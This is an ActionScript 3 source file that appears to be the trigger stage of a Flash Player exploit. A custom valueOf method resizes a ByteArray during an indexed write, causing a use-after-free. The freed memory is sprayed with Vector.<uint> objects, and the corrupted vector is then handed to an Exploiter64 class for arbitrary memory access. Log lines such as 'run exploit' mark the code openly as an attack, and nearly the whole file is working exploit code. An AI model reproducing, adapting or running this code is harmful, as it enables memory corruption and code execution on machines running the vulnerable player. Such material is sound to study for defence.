package 
{
	import flash.utils.ByteArray;
	import flash.display.DisplayObjectContainer;
	import flash.external.ExternalInterface;
	import flash.system.Capabilities;
	import flash.events.MouseEvent;
	
	/**
	 * ...
	 * @author dango
	 */
	public class MyClass 
	{
		static var _ba:ByteArray;
		static var _va:Array;
		static var _gc:Array;
		static var _corrupted:Vector.<uint>;
		static var _isDbg:Boolean = Capabilities.isDebugger;
		static var o:Object;
		
		function MyClass()
		{
			MyClass.prototype.valueOf = function()
			{
				Logger.log("MyCalss.valueOf()");
				_va = new Array(5);
				_gc.push(_va);
				_ba.length = 0x1100;
				for (var i:int; i < _va.length; i++ ){
					_va[i] = new Vector.<uint>(0x3f0);
				}
				return 0x40;
			}
		}
		
		static function run():Boolean 
		{
			Logger.log("run exploit");
			
			try
			{
				var aLen:int = 90;
				var a = new Array(aLen);
				if (_gc == null) _gc = new Array();
				_gc.push(a);
				
				for (var i:int = 0; i < aLen; i += 3 )
				{
					a[i] = new MyClass2(i);
					a[i + 1] = new ByteArray();
					a[i + 1].length = 0xfa0;
					a[i + 2] = new MyClass2(i + 2);
				}
			
				for (i = aLen - 5; i >= 0; i -= 3 )
				{
					_ba = a[i];
					_ba[3] = new MyClass();
					//if(_ba[3] != 0)
					
					for (var j:int; j < _va.length; j++ ){
						if (_va[j].length != 0x3f0)
						{
							_corrupted = _va[j];
						}
					}
					if (_corrupted != null)
					{
						Logger.log("[*] _corrupted.length = 0x" + _corrupted.length.toString(16));
						var exploiter:Exploiter64 = new Exploiter64(_corrupted, 0x3f0);
						return true
					}
				}
				Logger.log("[!] bad allocation. Try again");
				
			}
			catch (e:Error)
			{
				Logger.log("[!] run error "+e.toString());
			}
			return false;
		}
		
	}

}